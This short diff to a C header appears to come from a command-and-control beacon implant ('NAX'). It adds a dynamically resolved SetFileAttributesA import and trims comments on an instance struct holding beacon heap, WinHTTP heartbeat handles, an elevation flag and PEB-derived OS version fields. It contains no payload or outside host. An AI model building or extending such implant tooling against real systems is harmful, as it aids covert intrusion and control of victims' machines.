@@ -197,6 +197,7 @@ typedef struct {
     D_API( GetACP );
     D_API( GetOEMCP );
     D_API( GetProcessMitigationPolicy );
+    D_API( SetFileAttributesA );
 } NAX_KERNEL32;
 
 /* ========= [ kernelbase.dll ] ========= */
@@ -535,19 +536,19 @@ typedef struct {
 struct _NAX_INSTANCE {
     UINT32       Magic;          /* NAX_INSTANCE_MAGIC — validates TEB pointer */
     CHAR         SessionId[17];  /* 16 hex chars + NUL                    */
-    NAX_CONFIG   Config;         /* all runtime-configurable fields        */
-    HANDLE       Heap;           /* private beacon heap                    */
+    NAX_CONFIG   Config;
+    HANDLE       Heap;
 
     /* persistent WinHTTP handles - reused across heartbeats              */
-    HINTERNET    hSession;       /* WinHttpOpen (UA + proxy config)        */
-    HINTERNET    hConnect;       /* WinHttpConnect (host:port)             */
+    HINTERNET    hSession;
+    HINTERNET    hConnect;
 
     /* system info - gathered once at boot, sent in REGISTER */
     BYTE         Elevated;       /* 1 if running elevated / admin          */
     UINT32       OsMajor;        /* Windows major version (PEB+0x118)      */
     UINT32       OsMinor;        /* Windows minor version (PEB+0x11C)      */
     UINT16       OsBuild;        /* Windows build number  (PEB+0x120)      */
-    UINT32       ParentPid;      /* parent process ID                      */
+    UINT32       ParentPid;
     UINT32       Acp;            /* ANSI code page                         */
     UINT32       OemCp;          /* OEM code page                          */
     CHAR         ImgPath[260];   /* full image path (UTF-8)                */
